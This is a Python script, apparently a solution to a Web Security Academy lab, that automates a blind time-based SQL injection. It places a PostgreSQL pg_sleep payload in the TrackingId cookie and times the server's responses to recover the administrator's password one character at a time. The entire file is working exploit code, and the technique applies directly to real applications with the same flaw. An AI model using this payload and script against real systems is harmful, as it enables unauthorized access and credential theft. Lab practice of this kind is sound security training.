import requests
import string
import time

# Author: 0x2nac0nda

def time_based_sql_injection(url, character_set, session_cookie):
    """
    Perform time-based SQL injection to guess a password.
    
    :param url: Target URL for the SQL injection.
    :param character_set: Set of characters to use for guessing.
    :param session_cookie: Session cookie value for maintaining session.
    :return: Guessed password.
    """
    password = ""
    session = requests.Session()

    headers = {
        "Cache-Control": "max-age=0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "close",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3877.0 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9"
    }

    for position in range(1, 21):
        for character in character_set:
            cookies = {
                "TrackingId": f"6hVWELZ0Hxp48ugJ'||(select case when(username='administrator' and substring(password,{position},1)='{character}') then pg_sleep(10) else pg_sleep(0) end from users)||'z",
                "session": session_cookie
            }

            try:
                start_time = time.time()
                response = session.get(url, headers=headers, cookies=cookies)
                elapsed_time = time.time() - start_time

                if elapsed_time >= 10:  # Assuming a delay of 10 seconds indicates a match
                    password += character
                    print(password)
                    break
            except requests.RequestException as e:
                print(f"An error occurred: {e}")

    return password

# Target URL and session cookie
target_url = "https://0ad30007033cad1182753d7c00b40096.web-security-academy.net/"
session_cookie_value = "oZ4Su9lPQVSQ9RgPUA1kbraBPJBAhtD4"

# Base character set including lowercase, uppercase letters, and digits
base_characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

# Perform SQL injection to guess the password
guessed_password = time_based_sql_injection(target_url, base_characters, session_cookie_value)
print(f'[+] Found administrator password: [{guessed_password}]')
